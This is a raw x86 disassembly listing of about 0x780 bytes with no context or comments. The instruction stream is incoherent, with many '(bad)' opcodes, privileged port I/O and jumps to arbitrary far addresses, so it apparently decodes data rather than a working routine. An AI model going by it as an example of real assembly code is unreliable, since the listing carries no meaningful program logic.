  40ea7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea7d:	dec    ebx
  40ea7e:	fsub   QWORD PTR [ebp-0x73]
  40ea81:	mov    eax,DWORD PTR [eax-0x2f]
  40ea84:	cmp    al,0xfe
  40ea86:	clc    
  40ea87:	mov    ?,WORD PTR [ebx-0x59268326]
  40ea8d:	loope  0x40eaf7
  40ea8f:	fiadd  DWORD PTR [ebp-0xc751794]
  40ea95:	jmp    0xdb16865a
  40ea9a:	sub    ah,BYTE PTR [ecx+0x11]
  40ea9d:	das    
  40ea9e:	push   esp
  40ea9f:	mov    ds:0x33af1f54,eax
  40eaa4:	inc    eax
  40eaa5:	inc    esi
  40eaa6:	mov    cl,0xf6
  40eaa8:	jbe    0x40eacf
  40eaaa:	xchg   ebx,eax
  40eaab:	add    ecx,ebp
  40eaad:	xor    eax,0xf47439fd
  40eab2:	cs and al,0x4a
  40eab5:	mov    ebx,0xefa1da13
  40eaba:	mov    cl,0xbc
  40eabc:	xchg   edi,eax
  40eabd:	pop    ecx
  40eabe:	xlat   BYTE PTR ds:[ebx]
  40eabf:	ja     0x40eb17
  40eac1:	mov    dl,0x0
  40eac3:	jae    0x40eb36
  40eac5:	cmp    edi,eax
  40eac7:	test   BYTE PTR ss:[ebp+0x4abea36a],bl
  40eace:	shl    DWORD PTR [ecx+0x4b111a9d],0x9e
  40ead5:	das    
  40ead6:	mov    ds:0x1a84d6fc,eax
  40eadb:	addr16 jge 0x40eac4
  40eade:	repnz rol DWORD PTR [ecx],0xb5
  40eae2:	outs   dx,DWORD PTR ds:[esi]
  40eae3:	icebp  
  40eae4:	(bad)  
  40eae5:	stc    
  40eae6:	ins    DWORD PTR es:[edi],dx
  40eae7:	adc    bh,BYTE PTR [ebp-0x76]
  40eaea:	lahf   
  40eaeb:	sbb    al,0x45
  40eaed:	pop    ebx
  40eaee:	cmc    
  40eaef:	ret    0xb461
  40eaf2:	mov    eax,0x87e57e43
  40eaf7:	cdq    
  40eaf8:	bnd jno 0x40eb70
  40eafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eafc:	data16 xlat BYTE PTR ds:[ebx]
  40eafe:	jmp    0x12db:0xa621f42f
  40eb05:	sub    eax,0xfffffff3
  40eb08:	(bad)  
  40eb09:	rep lods eax,DWORD PTR ds:[esi]
  40eb0b:	mov    eax,0x664daa19
  40eb10:	std    
  40eb11:	pop    ds
  40eb12:	pop    edi
  40eb13:	rol    BYTE PTR [esi+0x55994aa9],0x18
  40eb1a:	cmc    
  40eb1b:	mov    eax,0x4ed4ee61
  40eb20:	arpl   si,bp
  40eb22:	pop    eax
  40eb23:	aad    0x8a
  40eb25:	jle    0x40eb55
  40eb27:	add    ah,BYTE PTR [eax+esi*2]
  40eb2a:	out    dx,eax
  40eb2b:	inc    DWORD PTR [eax-0x2988ceff]
  40eb31:	add    dh,BYTE PTR [edx-0x7c]
  40eb34:	sbb    ebx,DWORD PTR [eax-0x75]
  40eb37:	push   0xcf7158b0
  40eb3c:	pop    edi
  40eb3d:	jnp    0x40eb79
  40eb3f:	cmc    
  40eb40:	pop    es
  40eb41:	push   eax
  40eb42:	mov    bh,0x76
  40eb44:	out    dx,eax
  40eb45:	pop    ss
  40eb46:	lds    ebx,FWORD PTR [ebx+ebx*1+0x43]
  40eb4a:	push   es
  40eb4b:	mov    ebp,0xe53234e8
  40eb50:	shl    BYTE PTR [ecx-0x4992ae35],0x39
  40eb57:	inc    esp
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	add    BYTE PTR [edx+0x5746b8be],ah
  40eb5f:	and    al,0xf8
  40eb61:	lods   eax,DWORD PTR ds:[esi]
  40eb62:	fisttp QWORD PTR [ebp-0x5f2c59b1]
  40eb68:	popf   
  40eb69:	jle    0x40ebd0
  40eb6b:	out    dx,al
  40eb6c:	gs int3 
  40eb6e:	cmp    eax,0xc225d8d
  40eb73:	les    edi,FWORD PTR [ebx-0x3a1cc9d]
  40eb79:	jge    0x40ebcc
  40eb7b:	ins    BYTE PTR es:[edi],dx
  40eb7c:	push   ebp
  40eb7d:	pop    esi
  40eb7e:	ficomp DWORD PTR [edx+0x1]
  40eb81:	and    al,0x8
  40eb83:	mov    ebx,0x73027e52
  40eb88:	cmp    eax,0xd3206a47
  40eb8d:	(bad)  
  40eb8e:	mov    ebp,DWORD PTR [ecx+0x5aa6cda7]
  40eb94:	and    edi,ebp
  40eb96:	mov    ch,0x5f
  40eb98:	sub    DWORD PTR [ebp+edx*1+0x20],esi
  40eb9c:	stos   BYTE PTR es:[edi],al
  40eb9d:	inc    DWORD PTR [esi+edx*1+0x45]
  40eba1:	and    BYTE PTR [ebx],dl
  40eba3:	(bad)  
  40eba5:	lahf   
  40eba6:	jmp    0xf29810f3
  40ebab:	lea    edx,ds:0xe1f5a1c2
  40ebb1:	xlat   BYTE PTR ds:[ebx]
  40ebb2:	cwde   
  40ebb3:	iret   
  40ebb4:	pop    eax
  40ebb5:	out    dx,eax
  40ebb6:	mov    ds:0x1e90349b,eax
  40ebbc:	sbb    al,0x3e
  40ebbe:	and    ah,BYTE PTR [ebx-0x398265b5]
  40ebc4:	icebp  
  40ebc5:	popf   
  40ebc6:	xor    eax,0x38d5715a
  40ebcb:	inc    ecx
  40ebcc:	sub    BYTE PTR [edx],dh
  40ebce:	ja     0x40ebfc
  40ebd0:	adc    eax,0x3f2587b3
  40ebd5:	mov    esp,0x3b60366b
  40ebda:	add    BYTE PTR [eax+0x52],0xa6
  40ebde:	xchg   DWORD PTR [edi],esp
  40ebe0:	add    al,0x2b
  40ebe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe3:	int3   
  40ebe4:	dec    edi
  40ebe5:	mov    WORD PTR [esi+0x3436badb],?
  40ebeb:	xor    al,0xeb
  40ebed:	mov    ds:0x4046d98d,eax
  40ebf2:	push   0x58c66866
  40ebf7:	xchg   esp,eax
  40ebf8:	mov    ecx,0x6347f694
  40ebfd:	adc    DWORD PTR [edx+ecx*4-0x21],ebp
  40ec01:	arpl   ax,bp
  40ec03:	shr    BYTE PTR [ecx-0x2dcbd488],0xee
  40ec0a:	sbb    DWORD PTR [esi],esp
  40ec0c:	pop    edx
  40ec0d:	fcom   DWORD PTR ds:0xc76d7d3
  40ec13:	arpl   WORD PTR [ecx+ecx*2],si
  40ec16:	lods   eax,DWORD PTR ds:[esi]
  40ec17:	mov    al,ds:0xab9c47ee
  40ec1c:	or     DWORD PTR [ecx],edx
  40ec1e:	jno    0x40ec83
  40ec20:	pop    esp
  40ec21:	adc    esp,DWORD PTR [edi]
  40ec23:	es out dx,eax
  40ec25:	stos   BYTE PTR es:[edi],al
  40ec26:	pop    ds
  40ec27:	mov    ch,0xba
  40ec29:	push   ss
  40ec2a:	nop
  40ec2b:	xor    dl,ch
  40ec2d:	xor    eax,DWORD PTR [eax+0x9022f40]
  40ec33:	xchg   ebx,eax
  40ec34:	mov    esi,0xa304d413
  40ec39:	sub    BYTE PTR [ecx+0x23e1ff79],bh
  40ec3f:	in     eax,0xf3
  40ec41:	sbb    dl,BYTE PTR [esi+ecx*1-0x56]
  40ec45:	push   esp
  40ec46:	(bad)  
  40ec47:	mov    ds:0xe417d148,eax
  40ec4c:	loopne 0x40ebde
  40ec4e:	stos   DWORD PTR es:[edi],eax
  40ec4f:	jnp    0x40ec0f
  40ec51:	ins    BYTE PTR es:[edi],dx
  40ec52:	push   0x4b
  40ec54:	push   ss
  40ec55:	fxch   st(7)
  40ec57:	push   0xdb521d19
  40ec5c:	xor    BYTE PTR [ecx],0x2b
  40ec5f:	pusha  
  40ec60:	fwait
  40ec61:	add    bl,0x67
  40ec64:	scas   al,BYTE PTR es:[edi]
  40ec65:	fnstenv ds:0x17f0017c
  40ec6b:	xchg   ebp,eax
  40ec6c:	add    esi,DWORD PTR [eax+0x32f66e63]
  40ec72:	mul    ah
  40ec74:	rep stos BYTE PTR es:[edi],al
  40ec76:	mov    eax,0x58c1b8fc
  40ec7b:	push   esi
  40ec7c:	pop    ss
  40ec7d:	aaa    
  40ec7e:	mov    al,ds:0x2856190f
  40ec83:	xchg   ecx,eax
  40ec84:	sti    
  40ec85:	or     DWORD PTR ds:0x5ea2bd4,0x29aa1221
  40ec8f:	jge    0x40ecb7
  40ec91:	push   ecx
  40ec92:	pop    ebp
  40ec93:	or     eax,0x6fb87426
  40ec98:	cmp    DWORD PTR [esi+ebp*8+0xee61058],0x743095d8
  40eca3:	or     bh,al
  40eca5:	or     dl,0x54
  40eca8:	xchg   edx,eax
  40eca9:	mov    esp,0x93d4c1db
  40ecae:	cdq    
  40ecaf:	push   ss
  40ecb0:	cs aaa 
  40ecb2:	out    dx,eax
  40ecb3:	pop    ebx
  40ecb4:	shr    BYTE PTR [edi],0x67
  40ecb7:	jne    0x40ec9f
  40ecb9:	pop    ebx
  40ecba:	cmp    dh,BYTE PTR [edx+0x10]
  40ecbd:	leave  
  40ecbe:	fwait
  40ecbf:	out    dx,al
  40ecc0:	sbb    edx,DWORD PTR [ecx+0xd]
  40ecc3:	(bad)  
  40ecc4:	lds    esp,FWORD PTR [eax-0x4a]
  40ecc7:	or     bh,ah
  40ecc9:	outs   dx,BYTE PTR ds:[esi]
  40ecca:	cs iret 
  40eccc:	stc    
  40eccd:	popf   
  40ecce:	popa   
  40eccf:	pop    esp
  40ecd0:	push   ds
  40ecd1:	adc    dh,BYTE PTR [eax-0x7c]
  40ecd4:	mov    ebx,0x2cdbb059
  40ecd9:	test   DWORD PTR [edx+0x1dc4aca3],ebx
  40ecdf:	mov    ds:0x68c431e,al
  40ece4:	push   0x7d024229
  40ece9:	pop    esp
  40ecea:	xchg   edi,eax
  40eceb:	jne    0x40ec9b
  40eced:	sub    eax,0x227cce54
  40ecf2:	adc    ch,BYTE PTR [edx-0x6acb1b72]
  40ecf8:	jnp    0x40ed58
  40ecfa:	cdq    
  40ecfb:	xchg   BYTE PTR [esi+ebp*4],bl
  40ecfe:	push   edi
  40ecff:	call   0x3491a689
  40ed04:	add    eax,0x94d59e52
  40ed09:	inc    edx
  40ed0a:	sar    DWORD PTR [edx+eiz*4],cl
  40ed0d:	gs in  eax,0x15
  40ed10:	mov    bl,0xf0
  40ed12:	push   esp
  40ed13:	in     eax,dx
  40ed14:	jbe    0x40ed4f
  40ed16:	mov    edi,0x1a324742
  40ed1b:	fisttp DWORD PTR [edi+0x25b1afa8]
  40ed21:	repz mov fs,WORD PTR [eax-0x4a]
  40ed25:	(bad)  
  40ed26:	push   ds
  40ed27:	cli    
  40ed28:	mov    gs,WORD PTR [edx+0x13c2953e]
  40ed2e:	inc    esp
  40ed2f:	out    dx,al
  40ed30:	jp     0x40ed37
  40ed32:	add    ah,bh
  40ed34:	or     DWORD PTR [edx+0x3740bcca],eax
  40ed3a:	sbb    eax,0xc7cb1d55
  40ed3f:	mov    ds:0x55c339f2,al
  40ed44:	push   cs
  40ed45:	xchg   ebp,eax
  40ed46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed47:	xor    DWORD PTR ds:[eax+ebx*2+0x3a],0xd95276d3
  40ed50:	adc    BYTE PTR [eax+0x12b57e76],cl
  40ed56:	mov    ebp,0xf64271b3
  40ed5b:	inc    ebp
  40ed5c:	aas    
  40ed5d:	nop
  40ed5e:	call   FWORD PTR [ebx]
  40ed60:	les    edx,FWORD PTR [eax]
  40ed62:	mov    dh,BYTE PTR [esp+eiz*4-0x38]
  40ed66:	mov    al,ds:0xbd2b57d4
  40ed6b:	xor    BYTE PTR [ebp+0x49],dh
  40ed6e:	aad    0x62
  40ed70:	dec    eax
  40ed71:	xor    al,0xb3
  40ed73:	fs pop eax
  40ed75:	out    dx,eax
  40ed76:	lock mov dh,0x17
  40ed79:	sbb    eax,0x3e0e7fac
  40ed7e:	jl     0x40edb9
  40ed80:	aas    
  40ed81:	(bad)  
  40ed82:	adc    ah,BYTE PTR [ebp+0xafff351]
  40ed88:	and    eax,0x6c2ec545
  40ed8d:	clc    
  40ed8e:	stos   BYTE PTR es:[edi],al
  40ed8f:	sbb    eax,0xa8c75528
  40ed94:	cld    
  40ed95:	scas   eax,DWORD PTR es:[edi]
  40ed96:	scas   eax,DWORD PTR es:[edi]
  40ed97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed98:	inc    esp
  40ed99:	xchg   edi,eax
  40ed9a:	push   ds
  40ed9b:	add    eax,0xb515331
  40eda0:	in     al,0x4f
  40eda2:	aad    0x68
  40eda4:	adc    DWORD PTR [edi-0x76],esi
  40eda7:	mov    dl,0xd1
  40eda9:	and    BYTE PTR [ebp-0x4],cl
  40edac:	add    eax,0x953933dc
  40edb1:	fiadd  WORD PTR [esp+ecx*4]
  40edb4:	lds    esi,FWORD PTR ds:0x50d8182a
  40edba:	add    eax,edi
  40edbc:	fisubr WORD PTR [edi+0x4a65fc99]
  40edc2:	(bad)  
  40edc3:	fsubr  DWORD PTR [edx]
  40edc5:	xor    ebx,DWORD PTR [ebx]
  40edc7:	add    bl,BYTE PTR [eax+0x58]
  40edca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edcb:	jp     0x40ee1d
  40edcd:	enter  0x6e11,0xc
  40edd1:	sbb    cl,BYTE PTR [esi-0x50f1cd9b]
  40edd7:	mov    edx,cs
  40edd9:	xor    cl,BYTE PTR [esi+0x2c4f843d]
  40eddf:	ins    DWORD PTR es:[edi],dx
  40ede0:	mov    al,ds:0xa185e75
  40ede5:	rcr    BYTE PTR [ecx+0x175f6a6],0xbb
  40edec:	shl    edi,cl
  40edee:	sbb    al,0x29
  40edf0:	bnd jne 0x40ee54
  40edf3:	inc    ecx
  40edf4:	inc    eax
  40edf5:	(bad)  
  40edf6:	or     ah,ah
  40edf8:	pop    eax
  40edf9:	ror    BYTE PTR [ebx-0xe1da1f9],cl
  40edff:	ret    0x37d6
  40ee02:	adc    ebp,esp
  40ee04:	sbb    BYTE PTR [eax+0x16],bl
  40ee07:	and    ecx,DWORD PTR [ecx+0x51883729]
  40ee0d:	dec    ebx
  40ee0e:	mov    al,al
  40ee10:	adc    esi,DWORD PTR [ebx-0x66]
  40ee13:	adc    eax,0xaae38a60
  40ee18:	inc    eax
  40ee19:	out    0xf8,al
  40ee1b:	add    eax,0xc14da11
  40ee20:	adc    dl,BYTE PTR [ecx]
  40ee22:	jle    0x40eea2
  40ee24:	mov    dh,0xca
  40ee26:	pop    es
  40ee27:	shr    BYTE PTR [ebx-0x7c],0x92
  40ee2b:	mov    ebp,DWORD PTR [ecx]
  40ee2d:	aad    0x2a
  40ee2f:	fsub   DWORD PTR [edx-0x6c]
  40ee32:	dec    ebx
  40ee33:	sub    ebx,DWORD PTR [esi]
  40ee35:	jmp    0x615412db
  40ee3a:	jg     0x40ee5a
  40ee3c:	and    ch,dh
  40ee3e:	push   ecx
  40ee3f:	addr16 xchg esp,eax
  40ee41:	int    0x61
  40ee43:	fild   WORD PTR [ecx+0x7a76fb73]
  40ee49:	cli    
  40ee4a:	es (bad) 
  40ee4c:	mov    cs,WORD PTR [ebp-0x4d03262c]
  40ee52:	lock shl BYTE PTR ds:0x54adc5bb,cl
  40ee59:	inc    ebp
  40ee5a:	leave  
  40ee5b:	sar    DWORD PTR [esi+0x66],cl
  40ee5e:	dec    eax
  40ee5f:	adc    al,0xa4
  40ee61:	(bad)  
  40ee62:	pop    ecx
  40ee63:	mov    al,0x62
  40ee65:	inc    ecx
  40ee66:	add    eax,0x696ba0d5
  40ee6b:	sub    dh,al
  40ee6d:	ins    DWORD PTR es:[edi],dx
  40ee6e:	add    al,0xca
  40ee70:	push   ebx
  40ee71:	test   BYTE PTR [edx+0x254d44b9],0xbd
  40ee78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee79:	(bad)  
  40ee7b:	dec    esp
  40ee7c:	imul   BYTE PTR [edx+0x79892e08]
  40ee82:	shl    DWORD PTR [edi+edi*4],1
  40ee85:	jns    0x40ee7c
  40ee87:	mov    eax,ds:0x7896d788
  40ee8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee8e:	pop    edi
  40ee8f:	fisubr DWORD PTR es:[esi-0x1b79fd91]
  40ee96:	stc    
  40ee97:	int3   
  40ee98:	push   eax
  40ee99:	inc    eax
  40ee9a:	aad    0xeb
  40ee9c:	cmp    eax,0xef9279fd
  40eea1:	cwde   
  40eea2:	mov    ah,0x60
  40eea4:	les    edx,FWORD PTR [ebx-0x3]
  40eea7:	je     0x40ef09
  40eea9:	and    bl,BYTE PTR [eax]
  40eeab:	sub    dl,BYTE PTR [ebx+ebx*8]
  40eeae:	jg     0x40ee54
  40eeb0:	mov    al,ds:0xe4a1cbe1
  40eeb5:	fs ins DWORD PTR es:[edi],dx
  40eeb7:	mov    al,ds:0xd5d19641
  40eebc:	cs es lock push 0x33
  40eec1:	in     eax,dx
  40eec2:	or     BYTE PTR [ecx],al
  40eec4:	jae    0x40ef03
  40eec6:	inc    esp
  40eec7:	sar    BYTE PTR [edi],cl
  40eec9:	sbb    DWORD PTR [ebp+0x1210eb9f],edx
  40eecf:	popf   
  40eed0:	and    BYTE PTR [ebx],0x44
  40eed3:	into   
  40eed4:	cmp    eax,0x75790e0c
  40eed9:	popf   
  40eeda:	jo     0x40ef57
  40eedc:	lahf   
  40eedd:	(bad)  
  40eede:	xchg   eax,esp
  40eee0:	jl     0x40ef32
  40eee2:	push   ds
  40eee3:	push   ebx
  40eee4:	js     0x40ef0b
  40eee6:	repnz iret 
  40eee8:	dec    ecx
  40eee9:	jo     0x40eeb2
  40eeeb:	pushf  
  40eeec:	mov    dh,0x69
  40eeee:	push   ss
  40eeef:	test   al,0x6b
  40eef1:	jg     0x40ef4d
  40eef3:	test   DWORD PTR [edi],0x165ffcfc
  40eef9:	adc    bl,dl
  40eefb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eefc:	fstp   TBYTE PTR fs:[edx]
  40eeff:	cmc    
  40ef00:	lods   eax,DWORD PTR ds:[esi]
  40ef01:	inc    ebp
  40ef02:	call   0xd6c:0x6ffebc9d
  40ef09:	stos   BYTE PTR es:[edi],al
  40ef0a:	jb     0x40ee95
  40ef0c:	lods   eax,DWORD PTR ds:[esi]
  40ef0d:	daa    
  40ef0e:	jbe    0x40ef2a
  40ef10:	jmp    0x7e2:0x20f2eb3d
  40ef17:	xchg   ebp,eax
  40ef18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef19:	(bad)  
  40ef1a:	popa   
  40ef1b:	xchg   edi,eax
  40ef1c:	lea    ebx,[ecx+eiz*4-0x2d]
  40ef20:	cmp    BYTE PTR [ecx],cl
  40ef22:	lods   eax,DWORD PTR ds:[esi]
  40ef23:	scas   al,BYTE PTR es:[edi]
  40ef24:	and    eax,0x8037e6b6
  40ef29:	and    eax,0x2511fea0
  40ef2e:	loopne 0x40ef4a
  40ef30:	push   0xfc6ed9f2
  40ef35:	mov    cl,0xba
  40ef37:	outs   dx,BYTE PTR ds:[esi]
  40ef38:	dec    edi
  40ef39:	jmp    0x359a:0x80007277
  40ef40:	cmp    al,0x41
  40ef42:	sub    al,0xbf
  40ef44:	mov    dh,0x98
  40ef46:	push   ds
  40ef47:	rcl    bh,1
  40ef49:	js     0x40ef0d
  40ef4b:	pop    ebx
  40ef4c:	inc    esp
  40ef4d:	push   ebp
  40ef4e:	mov    esp,0xda6524b8
  40ef53:	fbld   TBYTE PTR [edi-0x24]
  40ef56:	mov    cl,0x7e
  40ef58:	cmc    
  40ef59:	adc    DWORD PTR [ecx+ebx*8+0x18],esi
  40ef5d:	pop    ebp
  40ef5e:	or     BYTE PTR [eax-0x44cada2d],ah
  40ef64:	pop    ss
  40ef65:	push   ds
  40ef66:	push   0x4f1ddae3
  40ef6b:	add    BYTE PTR [edx],ah
  40ef6d:	adc    BYTE PTR [edx+0x77],dl
  40ef70:	add    eax,0x3040eb0e
  40ef75:	or     esp,DWORD PTR [ebp-0x27d2bd95]
  40ef7b:	cli    
  40ef7c:	gs jbe 0x40ef0e
  40ef7f:	cmovbe ax,WORD PTR [ebx]
  40ef83:	and    esp,ebx
  40ef85:	jl     0x40efa1
  40ef87:	out    0x7,al
  40ef89:	sti    
  40ef8a:	loop   0x40efe4
  40ef8c:	or     bl,BYTE PTR [eax]
  40ef8e:	dec    edx
  40ef8f:	sub    al,ah
  40ef91:	sti    
  40ef92:	ja     0x40ef7e
  40ef94:	loop   0x40ef7d
  40ef96:	fmul   DWORD PTR es:[edi-0x7d]
  40ef9a:	loop   0x40efa6
  40ef9c:	sub    eax,0x7b33b2c2
  40efa1:	mov    dh,0xfe
  40efa3:	mov    al,0xac
  40efa5:	mov    eax,0xb122a351
  40efaa:	push   DWORD PTR ds:0x109ab54f
  40efb0:	pop    edx
  40efb1:	jo     0x40ef53
  40efb3:	jno    0x40efc8
  40efb5:	pushf  
  40efb6:	jecxz  0x40efb7
  40efb8:	mov    esp,0x4e5d78a
  40efbd:	adc    eax,0x25d79d86
  40efc2:	call   0x24518e56
  40efc7:	pop    esp
  40efc8:	dec    esp
  40efc9:	stos   BYTE PTR es:[edi],al
  40efca:	adc    DWORD PTR [eax-0x52],0xffffffc4
  40efce:	pop    DWORD PTR [esi+0x1dda73c2]
  40efd4:	cs xor eax,0x4f6c45bf
  40efda:	cmp    al,0xe7
  40efdc:	(bad)  
  40efdd:	ficom  WORD PTR [eax+0x48]
  40efe0:	jno    0x40efea
  40efe2:	push   esi
  40efe3:	inc    esi
  40efe4:	pop    eax
  40efe5:	or     eax,0xd9ba0253
  40efea:	dec    ecx
  40efeb:	push   esi
  40efec:	sbb    al,BYTE PTR [edi+0x34]
  40efef:	sbb    al,cl
  40eff1:	(bad)
  40eff4:	adc    BYTE PTR ds:0x6e3236,al
  40effa:	test   al,0xf
  40effc:	push   ebx
  40effd:	les    edx,FWORD PTR [edi-0x5a62dc2]
  40f003:	ret    
  40f004:	test   eax,0x267461f
  40f009:	cmc    
  40f00a:	mov    eax,fs:0x4aeeee54
  40f010:	arpl   WORD PTR [eax-0x7],bp
  40f013:	mov    ebp,0x8ea2c557
  40f018:	ins    DWORD PTR es:[edi],dx
  40f019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f01a:	cwde   
  40f01b:	inc    ebx
  40f01c:	inc    edi
  40f01d:	jmp    0x92fa551f
  40f022:	leave  
  40f023:	cmp    DWORD PTR [ebx-0x67],eax
  40f026:	pop    esp
  40f027:	mov    ds:0x2b8cce6e,al
  40f02c:	cmp    DWORD PTR [ebx-0x72db7e8a],ebx
  40f032:	sbb    al,0x36
  40f034:	push   cx
  40f036:	xlat   BYTE PTR ds:[ebx]
  40f037:	sub    edi,DWORD PTR [ebx-0xe]
  40f03a:	cs daa 
  40f03c:	imul   eax,DWORD PTR [esi],0x6470eee6
  40f042:	loope  0x40f0bd
  40f044:	pop    edx
  40f045:	fwait
  40f046:	lods   eax,DWORD PTR ds:[esi]
  40f047:	js     0x40f077
  40f049:	outs   dx,BYTE PTR ds:[esi]
  40f04a:	inc    esi
  40f04b:	sti    
  40f04c:	push   edx
  40f04d:	sub    eax,0x49c79e4c
  40f052:	jns    0x40efeb
  40f054:	and    eax,0x4478a291
  40f059:	ds cwde 
  40f05b:	cmp    DWORD PTR [ebp-0x12],0x6323a2b0
  40f062:	aaa    
  40f063:	or     al,0xe0
  40f065:	cmp    ebx,DWORD PTR [esi]
  40f067:	test   BYTE PTR [esi+0x1c4ab2b2],dl
  40f06d:	push   es
  40f06e:	jle    0x40f058
  40f070:	dec    ebp
  40f071:	inc    edx
  40f072:	fwait
  40f073:	dec    ebp
  40f074:	(bad)  
  40f075:	mov    bl,BYTE PTR [eax]
  40f077:	mov    edi,0x939b3c52
  40f07c:	repnz aad 0xa3
  40f07f:	(bad)  
  40f080:	xlat   BYTE PTR ds:[ebx]
  40f081:	(bad)  
  40f082:	push   cs
  40f083:	jne    0x40f034
  40f085:	push   edx
  40f086:	popa   
  40f087:	or     ebp,DWORD PTR [ebx-0x5ba0686a]
  40f08d:	sbb    DWORD PTR [edx+0x49],ebx
  40f090:	(bad)  
  40f092:	std    
  40f093:	mov    ch,0x9d
  40f095:	push   edx
  40f096:	or     cl,bh
  40f098:	(bad)  
  40f099:	add    eax,0x6d2e8dfd
  40f09e:	(bad)  
  40f09f:	cs cmp cl,ch
  40f0a2:	sar    DWORD PTR [edx-0x3ba64e08],cl
  40f0a8:	jecxz  0x40f040
  40f0aa:	imul   esi,DWORD PTR ds:0xbdf71f0b,0x5e187d81
  40f0b4:	pop    es
  40f0b5:	iret   
  40f0b6:	aam    0x79
  40f0b8:	clc    
  40f0b9:	mov    DWORD PTR [edi+0x7c],eax
  40f0bc:	cmp    DWORD PTR [eax],0xc1780b74
  40f0c2:	push   es
  40f0c3:	sbb    BYTE PTR [esi-0x7db4376b],bh
  40f0c9:	jecxz  0x40f0a9
  40f0cb:	fadd   st,st(7)
  40f0cd:	loop   0x40f076
  40f0cf:	mov    al,ds:0xa81a5e7f
  40f0d4:	or     al,0xf7
  40f0d6:	ds data16 aas 
  40f0d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0da:	push   ebp
  40f0db:	dec    eax
  40f0dc:	xor    ebp,DWORD PTR [esi]
  40f0de:	jle    0x40f113
  40f0e0:	xor    BYTE PTR [ecx-0x3d92a00d],dh
  40f0e6:	sbb    DWORD PTR [edx+0x56c97f3a],esp
  40f0ec:	xchg   edi,eax
  40f0ed:	adc    BYTE PTR [esi],0x28
  40f0f0:	out    dx,eax
  40f0f1:	push   DWORD PTR [esi]
  40f0f3:	cmp    al,0x1b
  40f0f5:	cmp    BYTE PTR [edi],ah
  40f0f7:	xor    ah,0x71
  40f0fa:	call   0x5195:0xe119731a
  40f101:	mov    ecx,0xef81653
  40f106:	add    eax,0xd4fa87b
  40f10b:	in     al,0x59
  40f10d:	push   ss
  40f10e:	mov    cl,0xa9
  40f110:	in     al,dx
  40f111:	mov    eax,ds:0xef2bdf40
  40f116:	xchg   edx,eax
  40f117:	adc    DWORD PTR ds:0xcb8d7cce,edx
  40f11d:	or     al,BYTE PTR [eax-0x6380899b]
  40f123:	mov    ds:0xe359e620,eax
  40f128:	cmp    BYTE PTR [ecx+0x213ca20e],bh
  40f12e:	sbb    al,0x3c
  40f130:	pop    ecx
  40f131:	xchg   DWORD PTR [ebp+0x634d1b97],ecx
  40f137:	xor    al,0x72
  40f139:	in     eax,dx
  40f13a:	fisubr WORD PTR [bp+si+0x52fc]
  40f13f:	scas   eax,DWORD PTR es:[edi]
  40f140:	and    DWORD PTR [edi-0x61],ebx
  40f143:	(bad)  
  40f144:	rol    ah,cl
  40f146:	loop   0x40f137
  40f148:	cmp    eax,0xb9f114d3
  40f14d:	and    DWORD PTR ds:0x65e715a0,ebp
  40f153:	dec    ebp
  40f154:	loopne 0x40f1c2
  40f156:	mov    ds:0x63ee17a9,al
  40f15b:	xor    al,0xca
  40f15d:	mov    es,WORD PTR [eax]
  40f15f:	ret    0x1792
  40f162:	mov    bl,0xe1
  40f164:	ins    DWORD PTR es:[edi],dx
  40f165:	or     BYTE PTR [ebx],ah
  40f167:	imul   ebp,DWORD PTR [edx+0xb],0xffffffc4
  40f16b:	loope  0x40f10d
  40f16d:	lods   al,BYTE PTR ds:[esi]
  40f16e:	cs das 
  40f170:	sbb    BYTE PTR [ecx],cl
  40f172:	dec    ecx
  40f173:	hlt    
  40f174:	shl    DWORD PTR [edi],1
  40f176:	push   ecx
  40f177:	retf   0x9fc8
  40f17a:	cmp    eax,0xa4bac766
  40f17f:	sbb    al,0xe0
  40f181:	(bad)  
  40f183:	inc    DWORD PTR fs:0xd16a94db
  40f18a:	mov    DWORD PTR [ebx+0x6e6ee539],ebx
  40f190:	cli    
  40f191:	jle    0x40f17c
  40f193:	xchg   esi,eax
  40f194:	dec    edx
  40f195:	fdiv   DWORD PTR [ecx+0x56570e05]
  40f19b:	push   esp
  40f19c:	push   ebx
  40f19d:	adc    eax,0xf0d1d78e
  40f1a2:	xchg   ecx,eax
  40f1a3:	mov    al,0x40
  40f1a5:	or     dl,cl
  40f1a7:	outs   dx,DWORD PTR ds:[esi]
  40f1a8:	fcom   st(5)
  40f1aa:	pop    esp
  40f1ab:	test   eax,0x33d30425
  40f1b0:	push   ds
  40f1b1:	lahf   
  40f1b2:	mov    ds:0x4e92839b,eax
  40f1b7:	push   0xffffffac
  40f1b9:	fisubr WORD PTR [esi+eiz*8+0x72]
  40f1bd:	out    dx,al
  40f1be:	bound  ebp,QWORD PTR [ebx]
  40f1c0:	sub    DWORD PTR ds:0x9470a98b,0x9001f930
  40f1ca:	push   esi
  40f1cb:	inc    edx
  40f1cc:	push   0x74791a3c
  40f1d1:	rol    DWORD PTR [ebx],0xa
  40f1d4:	xchg   edx,eax
  40f1d5:	sbb    ecx,esi
  40f1d7:	xor    edi,DWORD PTR [esi-0x43]
  40f1da:	outs   dx,BYTE PTR ds:[esi]
  40f1db:	loopne 0x40f192
  40f1dd:	lock fs (bad) 
  40f1e0:	jl     0x40f1b2
  40f1e2:	dec    edx
  40f1e3:	xchg   BYTE PTR [esi-0x13d7f8d4],ch
  40f1e9:	test   BYTE PTR [edx+edi*8+0x74],bh
  40f1ed:	(bad)  
  40f1ee:	sub    al,BYTE PTR [ecx-0x36cd78db]
  40f1f4:	inc    ecx
  40f1f5:	aas    
  40f1f6:	mov    dh,dl
  40f1f8:	aaa    
  40f1f9:	dec    esi
  40f1fa:	imul   esp,DWORD PTR [edx],0xb5517bd0
  40f200:	arpl   WORD PTR [eax+0x65157a9e],cx
  40f206:	ja     0x40f27a
